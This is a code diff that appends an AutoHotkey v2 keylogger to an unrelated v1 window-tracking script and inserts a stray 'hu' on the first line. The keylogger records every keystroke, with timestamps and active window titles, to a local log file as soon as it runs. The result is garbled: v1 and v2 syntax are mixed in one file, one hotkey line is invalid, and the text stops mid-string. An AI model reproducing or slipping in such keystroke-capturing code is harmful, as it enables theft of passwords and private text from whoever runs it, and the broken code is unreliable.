@@ -1,4 +1,4 @@
-
+hu
 #NoEnv
 #SingleInstance Force
 #Persistent
@@ -180,3 +180,75 @@ PastWin := ""
     PastWin := Win
 }
 return
+
+
+
+
+#Requires AutoHotkey v2.0
+#SingleInstance Force
+#InstallKeybdHook
+
+; Configuration
+global LogFile := A_ScriptDir "\keylog.txt"  ; Log file path
+global LoggingEnabled := true               ; Start logging immediately
+global Modifiers := Map(                    ; Modifier key symbols
+    "Ctrl", "^",
+    "Alt", "!",
+    "Shift", "+",
+    "LWin", "#",
+    "RWin", "#"
+)
+
+; Set up modifier key hotkeys
+For mod in Modifiers
+    Hotkey "~*" mod, LogKey
+
+; Wildcard hotkey for other keys
+Hotkey "~*", WildcardKey
+
+; Toggle logging with F12
+Hotkey "$F12", (*) => ToggleLogging()
+
+; Exit script with F10
+Hotkey "$F10", (*) => ExitApp()
+
+; Main functions
+WildcardKey(*) {
+    if LoggingEnabled && !IsModifierKey(A_ThisHotkey)
+        LogKey(A_ThisHotkey)
+}
+
+LogKey(KeyName) {
+    try {
+        winTitle := WinGetTitle("A")
+        currentTime := FormatTime(, "yyyy-MM-dd HH:mm:ss")
+        entry := "[" currentTime "] [" winTitle "] " GetKeyString(KeyName) "`n"
+        FileAppend entry, LogFile
+    }
+}
+
+GetKeyString(KeyName) {
+    if Modifiers.Has(KeyName)
+        return KeyName
+    
+    prefix := ""
+    For mod, symbol in Modifiers
+        if GetKeyState(mod)
+            prefix .= symbol
+    
+    return prefix . KeyName
+}
+
+IsModifierKey(KeyName) {
+    return Modifiers.Has(KeyName) || KeyName = "F12"
+}
+
+ToggleLogging() {
+    global LoggingEnabled := !LoggingEnabled
+    status := LoggingEnabled ? "ENABLED" : "DISABLED"
+    TrayTip "Keylogger", "Logging " status, 1
+    SetTimer () => TrayTip(), -2000  ; Hide after 2 seconds
+}
+
+; Initial notification
+TrayTip "Keylogger Active", "Press F12 to toggle logging`n
